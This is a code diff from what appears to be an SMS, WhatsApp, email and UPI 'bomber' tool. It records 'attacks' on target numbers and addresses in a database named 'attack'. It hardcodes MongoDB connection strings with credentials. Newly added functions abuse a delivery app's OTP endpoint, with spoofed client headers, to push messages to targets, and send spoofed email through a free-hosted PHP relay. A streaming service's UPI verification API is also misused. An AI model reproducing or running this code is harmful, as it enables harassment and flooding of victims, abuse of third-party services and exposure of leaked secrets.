@@ -9,6 +9,7 @@ from pytz import timezone
 from datetime import datetime
 import os
 from shutil import copyfile
+
 conp = MongoClient("mongodb+srv://thejatin:jatinkalwar@attacknum.nmuaiq8.mongodb.net/?retryWrites=true&w=majority")
 conn = MongoClient("mongodb+srv://jatinkalwar:shifaanam@mbomb.ghtntua.mongodb.net")
 
@@ -149,7 +150,8 @@ async def downloadindsms(tarnum, skey):
     await setup(file)
     return "ok"
 
-async def downindwhats(tarnum , skey):
+
+async def downindwhats(tarnum, skey):
     ind_time = datetime.now(timezone("Asia/Kolkata")).strftime('%Y-%m-%d %H:%M:%S.%f')
     conp.attack.attacknum.insert_one(
         {"key": skey, "on": tarnum, "type": "whatsapp", "count": "india", "when": str(ind_time)})
@@ -170,11 +172,12 @@ async def lookk(ip):
                 return i['key']
     return "no"
 
-async def downloadupi(upiid , ukey):
+
+async def downloadupi(upiid, ukey):
     ind_time = datetime.now(timezone("Asia/Kolkata")).strftime('%Y-%m-%d %H:%M:%S.%f')
     conp.attack.upidata.insert_one({"key": ukey, "on": str(upiid), "when": str(ind_time)})
     ko = os.getcwd()
-    if (os.path.exists(ko + "upicopy.py")==True):
+    if (os.path.exists(ko + "upicopy.py") == True):
         os.remove("upicopy.py")
     if (os.path.exists(ko + "bomber_upicopy.py") == True):
         os.remove("bomber_upicopy.py")
@@ -183,6 +186,7 @@ async def downloadupi(upiid , ukey):
     os.system(f"sed -i s/€tor/{upiid}/g upicopy.py")
     await setup(ufile)
     return "ok"
+
 
 async def verifyupi(upiid):
     try:
@@ -215,7 +219,8 @@ async def verifyupi(upiid):
         }
 
         async with aiohttp.ClientSession() as sess:
-            async with sess.post('https://prod-api.viewlift.com/subscription/upi/verify-vpa',params=params,headers=headers,json=json_data) as response:
+            async with sess.post('https://prod-api.viewlift.com/subscription/upi/verify-vpa', params=params,
+                                 headers=headers, json=json_data) as response:
                 datt = await response.json()
                 return datt['status']
 
@@ -223,14 +228,77 @@ async def verifyupi(upiid):
         print(e)
         return False
 
-async def sendmail( to , fromm , sub , msg , ekey):
+
+async def sendmail(to, fromm, sub, msg, ekey):
     try:
         ind_time = datetime.now(timezone("Asia/Kolkata")).strftime('%Y-%m-%d %H:%M:%S.%f')
-        conp.attack.emaildata.insert_one({"key": ekey, "on": to, "from": fromm, "subject": sub, "message": msg , "when": str(ind_time)})
-        response = requests.get(f'https://penological-contami.000webhostapp.com/se.php?first_name={sub}&last_name={fromm}&email={to}&message={msg}&submit=Submit' , )
+        conp.attack.emaildata.insert_one(
+            {"key": ekey, "on": to, "from": fromm, "subject": sub, "message": msg, "when": str(ind_time)})
+        response = requests.get(
+            f'https://penological-contami.000webhostapp.com/se.php?first_name={sub}&last_name={fromm}&email={to}&message={msg}&submit=Submit', )
         ko = response.json()
         return ko['status']
 
     except Exception as e:
         print(e)
         return "failed"
+
+
+async def cusapicall(num, msg):
+    try:
+        headers = {
+            # 'Host': 'homedeliverybackend.mpaani.com',
+            # 'Tracestate': '@nr=0-2---cb65b7d56e984c8a----1700744455274',
+            # 'Traceparent': '00-b5d65ca6de114a02baf871ec3ba6fadf-cb65b7d56e984c8a-00',
+            # 'Newrelic': 'eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiIiwiYXAiOiIiLCJ0ciI6ImI1ZDY1Y2E2ZGUxMTRhMDJiYWY4NzFlYzNiYTZmYWRmIiwiaWQiOiJjYjY1YjdkNTZlOTg0YzhhIiwidGkiOjE3MDA3NDQ0NTUyNzQsInRrIjoiIn19',
+            'Client-Code': 'charmander',
+            # 'Client-Version': '536',
+            # 'Accept-Language': 'en',
+            # 'Content-Type': 'application/json; charset=UTF-8',
+            # 'Content-Length': '213',
+            # 'Accept-Encoding': 'gzip, deflate, br',
+            # 'User-Agent': 'okhttp/3.12.1',
+            # 'X-Newrelic-Id': 'VwIOU1ZWChAGVFBRBQYEU1a=',
+        }
+
+        json_data = {
+            'phone_number': f'{num}',
+            'deviceId': f'{msg}',
+            # 'info': {
+            #     'deviceName': 'j2ltedd',
+            #     'modelNumber': 'S-00G',
+            #     'manufacturer': 'u',
+            #     'brand': 'u',
+            # },
+            'role': 'CUSTOMER',
+            'identification_hash': f'"{msg}"',
+        }
+        async with aiohttp.ClientSession() as sess:
+            async with sess.post('https://homedeliverybackend.mpaani.com/auth/send-otp', headers=headers,
+                                 json=json_data) as esponse:
+
+                response = await esponse.json()
+                out = response["success"]
+                if out == True:
+                    return "success"
+                else:
+                    return "fail"
+
+    except Exception as e:
+        print(e)
+        return "fail"
+
+
+async def sendcusmail(num, msg, deviceid):
+    try:
+        ind_time = datetime.now(timezone("Asia/Kolkata")).strftime('%Y-%m-%d %H:%M:%S.%f')
+        conp.attack.customsms.insert_one(
+            {"device": deviceid, "target": num, "message": msg, "time": str(ind_time)})
+        cusapi = await cusapicall(num, msg)
+
+        if cusapi == "success":
+            return "success"
+        else:
+            return "fail"
+    except Exception as e:
+        return "fail"
